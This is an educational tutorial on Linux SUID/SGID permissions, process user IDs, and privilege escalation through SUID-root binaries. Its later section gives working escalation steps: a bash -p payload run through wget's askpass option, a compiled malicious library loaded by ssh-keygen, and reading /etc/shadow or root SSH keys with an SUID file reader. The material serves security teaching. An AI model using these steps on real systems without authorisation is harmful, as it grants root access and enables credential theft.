# SUID and SGID: Linux Privilege Escalation Concepts

## 1. Understanding SUID and SGID

Linux uses a permission system to control who can read, write, and execute files. In addition to normal permissions (`rwx`), Linux provides **special permission bits** called:

* **SUID (Set User ID)**
* **SGID (Set Group ID)**

These permissions change **which user's privileges are used when a program runs**.

---

## SUID (Set User ID)

### Definition

**SUID allows a program to execute with the privileges of the file owner instead of the user who started it.**

Normally:

```
User runs program → Program runs with user's permissions
```

With SUID:

```
User runs SUID program → Program runs with owner's permissions
```

For example:

* A normal user executes a program.
* The program is owned by `root`.
* Because SUID is enabled, the program temporarily runs with **root privileges**.

---

### Example: The `passwd` Command

A good example of a legitimate SUID binary is:

```
/usr/bin/passwd
```

The `/etc/shadow` file stores encrypted user passwords:

```
-rw-r----- 1 root shadow /etc/shadow
```

Only root can modify this file.

However, normal users need to change their own passwords.

The solution:

1. The `passwd` program is owned by root.
2. The SUID bit is enabled.
3. When a user runs `passwd`, it temporarily runs as root.
4. It can update `/etc/shadow`.

Example:

```
-rwsr-xr-x 1 root root /usr/bin/passwd
```

Notice the `s`:

```
rws
 ||
 SUID enabled
```

The `s` replaces the owner's execute permission (`x`).

---

## Setting SUID Permission

The SUID bit can be enabled using:

```bash
chmod u+s filename
```

Example:

```bash
chmod u+s myprogram
```

Before:

```
-rwxr-xr-x myprogram
```

After:

```
-rwsr-xr-x myprogram
```

The owner execute permission changes:

```
x → s
```

---

# SGID (Set Group ID)

### Definition

**SGID allows a program to execute with the permissions of the file's group.**

It works similarly to SUID, but instead of the owner, it uses the owner's group.

Example:

A program belongs to:

```
Group: developers
```

With SGID enabled:

```
User runs program → Program runs with developers group privileges
```

SGID is commonly used for:

* Shared directories
* Collaborative environments
* Group-based access control

---

# 2. Understanding User IDs in Linux Processes

When a program runs, Linux tracks different user IDs to control permissions.

The three important IDs are:

1. **Real User ID (RUID)**
2. **Effective User ID (EUID)**
3. **Saved User ID**

---

# Real User ID (RUID)

### Definition

The **RUID identifies the actual user who started the program.**

Example:

User:

```
alice
UID: 1000
```

Runs:

```bash
./program
```

The process gets:

```
RUID = 1000
```

It shows who started the program.

---

# Effective User ID (EUID)

### Definition

The **EUID determines what permissions the running program currently has.**

Linux checks the EUID when deciding:

* Can this process read a file?
* Can it modify a system file?
* Can it perform privileged operations?

---

### Normal Program Example

A user runs:

```bash
./program
```

The IDs are:

```
RUID = 1000
EUID = 1000
```

The program has normal user permissions.

---

### SUID Program Example

Suppose:

```
program owner = root
SUID enabled
```

A normal user executes it:

```
./program
```

The process becomes:

```
RUID = 1000
EUID = 0
```

Where:

```
UID 0 = root
```

The program is now running with root privileges.

This is why SUID binaries are important in privilege escalation.

---

# Saved User ID

### Definition

The **Saved UID allows a privileged program to temporarily drop privileges and restore them later.**

Example:

A program starts as root:

```
RUID = 1000
EUID = 0
Saved UID = 0
```

The program may temporarily reduce privileges:

```
EUID = 1000
```

Later, it can restore:

```
EUID = 0
```

using the saved UID.

This feature is useful for programs that only need root privileges for specific operations.

---

# Example Program Behaviour

Imagine a C program:

```c
printf("RUID: %d\n", getuid());
printf("EUID: %d\n", geteuid());
system("touch file.txt");
```

---

## Running Normally

User:

```
L
UID = 1000
```

Execution:

```bash
./program
```

Output:

```
RUID: 1000
EUID: 1000
```

Created file:

```
owner: L
```

---

## Running as SUID Root

File ownership:

```
root root program
```

SUID enabled:

```
-rwsr-xr-x program
```

User executes:

```bash
./program
```

Output:

```
RUID: 1000
EUID: 0
```

Created file:

```
owner: root
```

The program is executing with root privileges.

---

# 3. Security Risks of SUID Files

SUID itself is not a vulnerability.

The problem occurs when:

* A vulnerable program has SUID enabled.
* The program is owned by root.
* A normal user can abuse its functionality.

Example:

```
Normal user
      |
      v
SUID root program
      |
      v
Root privileges
```

If the program allows:

* Command execution
* File reading
* Library loading
* Unsafe scripting

An attacker may gain root access.

---

# Finding Dangerous SUID Files

Security testers often search for SUID binaries:

```bash
find / -perm -4000 2>/dev/null
```

Example output:

```
/usr/bin/passwd
/usr/bin/vim
/usr/bin/find
/usr/bin/custom_binary
```

Security researchers use resources such as **GTFOBins** to check whether known binaries can be abused when they have SUID permissions.

---

# 4. Common SUID Exploitation Techniques

## 1. Abusing File Downloaders (`wget`)

### Concept

Some programs have features that execute external commands.

If `wget` has SUID root permissions, unsafe options may allow command execution.

---

### Attack Idea

Create a malicious script:

```bash
#!/bin/sh
/bin/bash -p
```

The `-p` option tells Bash:

> Keep the inherited privileges instead of dropping them.

Make it executable:

```bash
chmod +x payload
```

Run:

```bash
wget --use-askpass=/tmp/payload
```

If `wget` runs as root:

```
wget (root)
      |
      v
payload script
      |
      v
root shell
```

---

# 2. Abusing File Readers (`xxd`)

### Concept

Some binaries can read files.

If a file-reading program has SUID root permissions, users may access protected files.

Example:

Sensitive files:

```
/etc/shadow
/root/.ssh/id_rsa
```

Normally:

```
Normal user → Access denied
```

But:

```
SUID reader → Reads as root
```

An attacker may steal:

* Password hashes
* SSH private keys
* Configuration files

Example:

```
Root SSH key stolen
        |
        v
Login as root
```

---

# 3. Shared Library Injection (`ssh-keygen`)

## Concept

Some programs allow loading external libraries.

Shared libraries:

```
.so files
```

contain reusable code.

If a SUID binary loads a user-controlled library, the attacker can execute code as root.

---

## Example: `ssh-keygen`

The `-D` option loads PKCS#11 libraries:

```bash
ssh-keygen -D library.so
```

An attacker creates:

```
malicious.so
```

containing code that:

1. Sets UID to root:

```c
setuid(0);
setgid(0);
```

2. Starts a shell.

---

Compile:

```bash
gcc -shared -nostartfiles -fPIC \
-o malicious.so malicious.c
```

Execute:

```bash
ssh-keygen -D ./malicious.so
```

Execution flow:

```
ssh-keygen (SUID root)
          |
          |
     loads library
          |
          v
   malicious code runs
          |
          v
       root shell
```

---

# 4. Abusing Interactive Text Editors

Programs like:

* Vim
* Emacs

are powerful because they include scripting features.

Normally these features are useful.

However, under SUID root:

```
Editor runs as root
        |
        v
Editor commands execute as root
```

---

# Vim Abuse

Vim provides commands that can execute system commands.

Example concept:

```
Vim
 |
 +--> Execute shell command
 |
 +--> Root shell
```

If Vim is SUID root, those commands execute with root privileges.

---

# Emacs Abuse

Emacs contains a Lisp interpreter.

Options such as:

```
-q
```

disable user configuration.

```
-nw
```

runs inside the terminal.

```
--eval
```

executes Lisp expressions.

A malicious expression can launch a shell:

```
Emacs (root)
       |
       v
 Lisp execution
       |
       v
 Root shell
```

---

# Summary

| Concept   | Meaning                                                          |
| --------- | ---------------------------------------------------------------- |
| SUID      | Run program with owner's privileges                              |
| SGID      | Run program with group's privileges                              |
| RUID      | User who started the process                                     |
| EUID      | Current permission level of the process                          |
| Saved UID | Allows temporary privilege dropping and restoring                |
| UID 0     | Root user                                                        |
| SUID risk | Vulnerable root programs can give attackers root access          |
| GTFOBins  | Database of binaries that may be abused for privilege escalation |

---

